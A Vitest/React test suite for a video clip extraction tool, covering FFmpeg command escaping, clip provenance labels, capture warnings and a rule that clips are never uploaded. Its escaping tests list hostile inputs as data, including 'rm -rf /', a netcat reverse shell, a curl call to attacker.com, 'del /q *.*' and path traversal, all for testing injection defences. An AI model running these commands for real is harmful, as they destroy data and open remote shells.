import React from 'react';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen, fireEvent, waitFor, act } from '@testing-library/react';
import {
  generateNativeCommand,
  escapePowerShellArg,
  escapeCmdArg,
  escapeBashArg,
  sanitizeFilename,
  ensureSafeCliPath,
  stripControlChars,
} from '../src/features/videos/nativeCommandGenerator';
import {
  isBrowserCaptureSupported,
  getPreferredMimeType,
  extractClipWithBrowserCapture,
  measureVideoFileDuration,
} from '../src/features/videos/browserCaptureExtractor';
import { generateSourceInstanceId } from '../src/features/videos/useLocalVideo';
import { ClipExtractionModal } from '../src/features/videos/ClipExtractionModal';
import { StagedClipCard } from '../src/features/videos/StagedClipCard';
import { App } from '../src/App';
import { LocalVideoItem, StagedClipItem } from '../src/shared/types';
import { api } from '../src/shared/api/client';

describe('Task 3B & 3B.1: Extraction Reliability, Provenance, and Security Test Suite', () => {
  const mockFile = new File(['dummy-castle-video-data'], 'kitchen_8_day_1.mp4', {
    type: 'video/mp4',
  });

  const mockLocalVideo: LocalVideoItem = {
    sourceType: 'local',
    sourceInstanceId: 'src_test_instance_kitchen_1',
    file: mockFile,
    objectUrl: 'blob:http://localhost:3000/local-kitchen-uuid',
    filename: 'kitchen_8_day_1.mp4',
    sizeBytes: 1323258538, // 1.28 GB
    durationSeconds: 3600,
  };

  const sampleInterval = {
    start: 72.5,
    end: 87.5,
    label: 'Suspect opens refrigerator',
  };

  beforeEach(() => {
    vi.restoreAllMocks();
  });

  // =========================================================================
  // Section 1: Command Generation, Argument Escaping, and Adversarial Security
  // =========================================================================
  describe('1. Native Command Generation, Argument Escaping & Adversarial Security', () => {
    it('generates secure PowerShell command and script without -y (no silent overwrite)', () => {
      const result = generateNativeCommand('powershell', {
        sourceFilename: "suspicious;rm -rf;video's.mp4",
        sourcePathPlaceholder: "D:\\Recordings\\suspicious;video's.mp4",
        startSeconds: 72.5,
        endSeconds: 87.5,
        mode: 'frame_accurate',
      });

      expect(result.shell).toBe('powershell');
      expect(result.isFrameAccurate).toBe(true);
      // Omit -y to avoid silently overwriting existing files
      expect(result.commandLine).toContain('ffmpeg -ss 00:01:12.500 -to 00:01:27.500');
      expect(result.commandLine).not.toContain('ffmpeg -y');
      expect(result.commandLine).toContain("-c:v libx264 -preset veryfast -crf 22 -c:a aac -b:a 128k");
      // Escaped single quote inside PowerShell is ''
      expect(result.commandLine).toContain("'D:\\Recordings\\suspicious;video''s.mp4'");
      expect(result.scriptExtension).toBe('ps1');
      expect(result.scriptContent).toContain('Write-Host "Extracting short clip');
    });

    it('generates secure Windows CMD command and escapes % as %% in batch scripts', () => {
      const result = generateNativeCommand('cmd', {
        sourceFilename: 'video %PATH% name.mp4',
        sourcePathPlaceholder: 'C:\\Videos\\%PATH%\\test.mp4',
        startSeconds: 1815.0,
        endSeconds: 1845.0,
        mode: 'frame_accurate',
      });

      expect(result.shell).toBe('cmd');
      expect(result.commandLine).toContain('ffmpeg -ss 00:30:15.000 -to 00:30:45.000');
      expect(result.commandLine).not.toContain('ffmpeg -y');
      // Direct CMD command preserves quotes
      expect(result.commandLine).toContain('"C:\\Videos\\%PATH%\\test.mp4"');
      // Script (.bat) escapes % as %% to prevent environment variable expansion
      expect(result.scriptContent).toContain('"C:\\Videos\\%%PATH%%\\test.mp4"');
      expect(result.scriptExtension).toBe('bat');
      expect(result.scriptContent).toContain('@echo off');
    });

    it('generates secure Linux/macOS Bash command with single-quote escaping', () => {
      const result = generateNativeCommand('bash', {
        sourceFilename: "injection$test'file.mp4",
        sourcePathPlaceholder: "/mnt/storage/injection$test'file.mp4",
        startSeconds: 3310.0,
        endSeconds: 3370.0,
        mode: 'fast_copy',
      });

      expect(result.shell).toBe('bash');
      expect(result.isFrameAccurate).toBe(false);
      expect(result.commandLine).toContain('ffmpeg -ss 00:55:10.000 -to 00:56:10.000');
      expect(result.commandLine).not.toContain('ffmpeg -y');
      expect(result.commandLine).toContain('-c copy -avoid_negative_ts make_zero');
      // Single quote in bash escaped as '\''
      expect(result.commandLine).toContain("'/mnt/storage/injection$test'\\''file.mp4'");
      expect(result.scriptExtension).toBe('sh');
      expect(result.keyframeWarning).toContain('GOP in CASTLE recordings');
    });

    it('prevents CLI option injection for filenames beginning with hyphens', () => {
      // Filename starting with hyphen could be misparsed as an FFmpeg or shell argument
      const psSafe = escapePowerShellArg('-vf_custom_filter.mp4');
      expect(psSafe).toBe("'.\\-vf_custom_filter.mp4'");

      const cmdSafe = escapeCmdArg('-i_exploit.mp4', false);
      expect(cmdSafe).toBe('".\\-i_exploit.mp4"');

      const bashSafe = escapeBashArg('-rf_wipeout.mp4');
      expect(bashSafe).toBe("'./-rf_wipeout.mp4'");
    });

    it('strips newlines and carriage returns to prevent multiline command injection', () => {
      const malicious = "input.mp4\r\nrm -rf / --no-preserve-root\ncalc.exe";
      expect(stripControlChars(malicious)).toBe("input.mp4rm -rf / --no-preserve-rootcalc.exe");

      const psEscaped = escapePowerShellArg("file\ncalc.exe\r.mp4");
      expect(psEscaped).not.toContain('\n');
      expect(psEscaped).not.toContain('\r');
      expect(psEscaped).toBe("'filecalc.exe.mp4'");
    });

    it('sanitizes unsafe output filenames and retains Unicode characters', () => {
      expect(sanitizeFilename('my clip!@#$%^&*()_+name.mp4')).toBe('my_clip_name.mp4');
      expect(sanitizeFilename('../../../etc/passwd')).toBe('passwd.mp4');
      expect(sanitizeFilename('-hyphen_start.mp4')).toBe('hyphen_start.mp4');
      expect(sanitizeFilename('küchen_überwachung_🎥.mp4')).toBe('küchen_überwachung_.mp4');
      expect(sanitizeFilename('测试_видео.mp4')).toBe('测试_видео.mp4');
    });

    it('adversarial injection tests: validates that shell metacharacters are safely contained', () => {
      const vectors = [
        "$(whoami)",
        "`calc.exe`",
        "video; curl http://attacker.com",
        "file && del /q *.*",
        "video | nc -e cmd.exe 127.0.0.1 4444",
        "file > overwrite.txt",
        "video' OR '1'='1",
        'video" & notepad & "',
      ];

      for (const vector of vectors) {
        const ps = escapePowerShellArg(vector);
        expect(ps.startsWith("'")).toBe(true);
        expect(ps.endsWith("'")).toBe(true);
        // Ensure no unescaped single quotes remain that could break the string
        const unescapedSingleQuotes = ps.slice(1, -1).replace(/''/g, '');
        expect(unescapedSingleQuotes).not.toContain("'");

        const bash = escapeBashArg(vector);
        expect(bash.startsWith("'")).toBe(true);
        expect(bash.endsWith("'")).toBe(true);

        const cmd = escapeCmdArg(vector, true);
        expect(cmd.startsWith('"')).toBe(true);
        expect(cmd.endsWith('"')).toBe(true);
      }
    });
  });

  // =========================================================================
  // Section 2: Timestamp Provenance & Staged Clip Item Representation
  // =========================================================================
  describe('2. Timestamp Provenance & Staged Clip Representation', () => {
    it('never marks an imported clip as verified solely because frame-accurate command was generated', async () => {
      const onClipStaged = vi.fn();
      const onClose = vi.fn();

      const shortClipFile = new File(['fake-short-clip-mp4'], 'kitchen_clip_15s.mp4', {
        type: 'video/mp4',
      });

      render(
        <ClipExtractionModal
          isOpen={true}
          onClose={onClose}
          localVideo={mockLocalVideo}
          interval={sampleInterval}
          onClipStaged={onClipStaged}
        />
      );

      // In Mode A (Native FFmpeg Assisted), simulate user dropping the produced clip
      const dropzone = screen.getByTestId('stage-dropzone');
      const fileInput = dropzone.querySelector('input[type="file"]') as HTMLInputElement;

      await act(async () => {
        fireEvent.change(fileInput, { target: { files: [shortClipFile] } });
      });

      const confirmBtn = screen.getByTestId('confirm-stage-ffmpeg-btn');
      expect(confirmBtn).toBeInTheDocument();

      fireEvent.click(confirmBtn);

      expect(onClipStaged).toHaveBeenCalledTimes(1);
      const staged: StagedClipItem = onClipStaged.mock.calls[0][0];

      // CRITICAL CHECK: Mode A must be 'user_confirmed', NOT 'verified'!
      expect(staged.alignmentStatus).toBe('user_confirmed');
      expect(staged.alignmentStatus).not.toBe('verified');
      expect(staged.userConfirmedAssociation).toBe(true);
      expect(staged.method).toBe('native_ffmpeg_assisted');
      expect(staged.sourceVideoRef).toBe(mockLocalVideo.sourceInstanceId);
      expect(staged.sourceStartSeconds).toBe(72.5);
      expect(staged.sourceEndSeconds).toBe(87.5);
      expect(staged.sourceDurationSeconds).toBe(15.0);
    });

    it('stages Mode A with fast stream copy as approximate alignment', async () => {
      const onClipStaged = vi.fn();

      render(
        <ClipExtractionModal
          isOpen={true}
          onClose={vi.fn()}
          localVideo={mockLocalVideo}
          interval={sampleInterval}
          onClipStaged={onClipStaged}
        />
      );

      // Select fast copy mode button
      fireEvent.click(screen.getByTestId('mode-fast-copy-btn'));

      const dropzone = screen.getByTestId('stage-dropzone');
      const fileInput = dropzone.querySelector('input[type="file"]') as HTMLInputElement;
      const testFile = new File(['fast-copy-data'], 'clip_fast.mp4', { type: 'video/mp4' });

      await act(async () => {
        fireEvent.change(fileInput, { target: { files: [testFile] } });
      });

      fireEvent.click(screen.getByTestId('confirm-stage-ffmpeg-btn'));

      const staged: StagedClipItem = onClipStaged.mock.calls[0][0];
      expect(staged.alignmentStatus).toBe('approximate');
      expect(staged.userConfirmedAssociation).toBe(true);
    });

    it('renders StagedClipCard with user_confirmed badge, sourceInstanceId, and association status', () => {
      const mockStagedClip: StagedClipItem = {
        id: 'staged_test_1',
        file: new File(['data'], 'test_clip.mp4', { type: 'video/mp4' }),
        objectUrl: 'blob:http://localhost:3000/staged-test-uuid',
        filename: 'test_clip.mp4',
        sizeBytes: 15728640,
        durationSeconds: 15.0,
        measuredDurationSeconds: 15.0,
        method: 'native_ffmpeg_assisted',
        alignmentStatus: 'user_confirmed',
        userConfirmedAssociation: true,
        sourceVideoName: 'kitchen_8_day_1.mp4',
        sourceVideoRef: 'src_test_instance_kitchen_1',
        sourceStartSeconds: 72.5,
        sourceEndSeconds: 87.5,
        sourceDurationSeconds: 15.0,
        durationDeltaSeconds: 0.0,
        notes: 'Suspect enters kitchen',
        createdAt: new Date().toISOString(),
      };

      render(
        <StagedClipCard
          stagedClip={mockStagedClip}
          onReplace={vi.fn()}
          onClear={vi.fn()}
        />
      );

      expect(screen.getByTestId('staged-clip-card')).toBeInTheDocument();
      expect(screen.getByText('test_clip.mp4')).toBeInTheDocument();
      expect(screen.getByText('Native FFmpeg Assisted')).toBeInTheDocument();
      expect(screen.getByText('Alignment: User-Confirmed')).toBeInTheDocument();
      expect(screen.getAllByText(/User-Confirmed/)[0]).toBeInTheDocument();
      expect(screen.getByText(/00:01:12.500 → 00:01:27.500/)).toBeInTheDocument();
    });
  });

  // =========================================================================
  // Section 3: Browser Capture Warnings & Delta Oversight
  // =========================================================================
  describe('3. Browser Capture Warnings and Delta Oversight', () => {
    it('displays prominent experimental notice with duration, tab visibility, and overshoot warnings', () => {
      render(
        <ClipExtractionModal
          isOpen={true}
          onClose={vi.fn()}
          localVideo={mockLocalVideo}
          interval={sampleInterval}
          onClipStaged={vi.fn()}
        />
      );

      // Switch to Mode C: Browser Capture
      fireEvent.click(screen.getByTestId('tab-mode-c'));

      const warningNotice = screen.getByTestId('browser-capture-warning');
      expect(warningNotice).toBeInTheDocument();
      expect(warningNotice).toHaveTextContent('Real-Time Duration');
      expect(warningNotice).toHaveTextContent('Tab Visibility');
      expect(warningNotice).toHaveTextContent('0.6–1.1s duration overshoot');
      expect(warningNotice).toHaveTextContent('Native FFmpeg is strongly recommended');
    });

    it('renders experimental capture warning in StagedClipCard when method is browser_capture', () => {
      const capturedClip: StagedClipItem = {
        id: 'staged_capture_1',
        file: new File(['data'], 'browser_clip.mp4', { type: 'video/mp4' }),
        objectUrl: 'blob:http://localhost:3000/browser-uuid',
        filename: 'browser_clip.mp4',
        sizeBytes: 8000000,
        durationSeconds: 15.82,
        measuredDurationSeconds: 15.82,
        method: 'browser_capture',
        alignmentStatus: 'approximate',
        userConfirmedAssociation: true,
        sourceVideoName: 'kitchen_8_day_1.mp4',
        sourceVideoRef: 'src_test_instance_kitchen_1',
        sourceStartSeconds: 72.5,
        sourceEndSeconds: 87.5,
        sourceDurationSeconds: 15.0,
        durationDeltaSeconds: 0.82,
        createdAt: new Date().toISOString(),
      };

      render(
        <StagedClipCard
          stagedClip={capturedClip}
          onReplace={vi.fn()}
          onClear={vi.fn()}
        />
      );

      const warningBanner = screen.getByTestId('staged-clip-capture-warning');
      expect(warningBanner).toBeInTheDocument();
      expect(warningBanner).toHaveTextContent('Experimental Capture Notice');
      expect(warningBanner).toHaveTextContent('+0.82s');
      expect(warningBanner).toHaveTextContent('unverified DTS');
      expect(warningBanner).toHaveTextContent('native FFmpeg extraction (Mode A) is recommended');
    });
  });

  // =========================================================================
  // Section 4: Source Video Identity & Collision Resistance
  // =========================================================================
  describe('4. Source Video Identity & Collision Resistance', () => {
    it('generates unique collision-resistant sourceInstanceIds for different selections of same file', () => {
      const id1 = generateSourceInstanceId();
      const id2 = generateSourceInstanceId();
      expect(typeof id1).toBe('string');
      expect(typeof id2).toBe('string');
      expect(id1).not.toBe(id2);
      expect(id1.length).toBeGreaterThan(10);
    });

    it('clears staged clip and revokes object URL when local source video is replaced or cleared', async () => {
      vi.spyOn(api, 'getVideos').mockResolvedValue({
        videos: [
          {
            video_id: 'srv_1',
            filename: 'server_clip.mp4',
            duration_seconds: 20,
            size_bytes: 4000000,
          },
        ],
      });

      let containerEl!: HTMLElement;
      await act(async () => {
        const res = render(<App />);
        containerEl = res.container;
      });

      const fileInput = containerEl.querySelector('input[type="file"]') as HTMLInputElement;

      // 1. Open Local File 1
      await act(async () => {
        fireEvent.change(fileInput, { target: { files: [mockFile] } });
      });

      // Open extraction modal and stage a clip
      const extractBtn = screen.getByTestId('extract-clip-btn');
      fireEvent.click(extractBtn);

      fireEvent.click(screen.getByTestId('tab-mode-b'));
      const dropzoneInput = screen.getByTestId('import-clip-dropzone').querySelector('input[type="file"]') as HTMLInputElement;
      const dummyClip = new File(['clip-bytes'], 'clip1.mp4', { type: 'video/mp4' });

      await act(async () => {
        fireEvent.change(dropzoneInput, { target: { files: [dummyClip] } });
      });

      fireEvent.click(screen.getByTestId('confirm-direct-import-btn'));

      // Staged clip card is now visible
      expect(screen.getByTestId('staged-clip-card')).toBeInTheDocument();

      // 2. Select a different local file 2
      const mockFile2 = new File(['file-2-bytes'], 'another_surveillance.mp4', {
        type: 'video/mp4',
      });

      await act(async () => {
        fireEvent.change(fileInput, { target: { files: [mockFile2] } });
      });

      // Previous staged clip must be cleared and revoked
      expect(screen.queryByTestId('staged-clip-card')).not.toBeInTheDocument();
    });
  });

  // =========================================================================
  // Section 5: Asynchronous Resource Cleanup & Zero Upload Enforcement
  // =========================================================================
  describe('5. Asynchronous Resource Cleanup & Zero Upload Enforcement', () => {
    it('aborts running capture and resets modal state when source video changes while modal is open', async () => {
      const onClipStaged = vi.fn();
      const onClose = vi.fn();

      const { rerender } = render(
        <ClipExtractionModal
          isOpen={true}
          onClose={onClose}
          localVideo={mockLocalVideo}
          interval={sampleInterval}
          onClipStaged={onClipStaged}
        />
      );

      // Switch to Mode B and select a file
      fireEvent.click(screen.getByTestId('tab-mode-b'));
      const fileInput = screen.getByTestId('import-clip-dropzone').querySelector('input[type="file"]') as HTMLInputElement;
      const dummyClip = new File(['clip-bytes'], 'clip1.mp4', { type: 'video/mp4' });

      await act(async () => {
        fireEvent.change(fileInput, { target: { files: [dummyClip] } });
      });

      expect(screen.getByTestId('confirm-direct-import-btn')).toBeInTheDocument();

      // Now rerender with a NEW sourceInstanceId (representing source video replacement)
      const newSourceVideo: LocalVideoItem = {
        ...mockLocalVideo,
        sourceInstanceId: 'src_new_instance_999',
        filename: 'new_video.mp4',
      };

      rerender(
        <ClipExtractionModal
          isOpen={true}
          onClose={onClose}
          localVideo={newSourceVideo}
          interval={sampleInterval}
          onClipStaged={onClipStaged}
        />
      );

      // The unconfirmed imported file from old video must be discarded
      expect(screen.queryByTestId('confirm-direct-import-btn')).not.toBeInTheDocument();
    });

    it('verifies that extracting and staging a clip NEVER uploads video to FastAPI', async () => {
      const uploadSpy = vi.spyOn(api, 'uploadVideo');
      const submitUnderstandingSpy = vi.spyOn(api, 'submitVideoUnderstanding');

      render(
        <ClipExtractionModal
          isOpen={true}
          onClose={vi.fn()}
          localVideo={mockLocalVideo}
          interval={sampleInterval}
          onClipStaged={vi.fn()}
        />
      );

      // Perform mode switches, copy command, and stage a file
      fireEvent.click(screen.getByTestId('tab-mode-a'));
      fireEvent.click(screen.getByTestId('copy-command-btn'));

      fireEvent.click(screen.getByTestId('tab-mode-b'));
      const dummyClip = new File(['clip-bytes'], 'test_clip.mp4', { type: 'video/mp4' });
      const dropzoneInput = screen.getByTestId('import-clip-dropzone').querySelector('input[type="file"]') as HTMLInputElement;

      await act(async () => {
        fireEvent.change(dropzoneInput, { target: { files: [dummyClip] } });
      });

      fireEvent.click(screen.getByTestId('confirm-direct-import-btn'));

      // Zero uploads occurred
      expect(uploadSpy).not.toHaveBeenCalled();
      expect(submitUnderstandingSpy).not.toHaveBeenCalled();
    });
  });
});
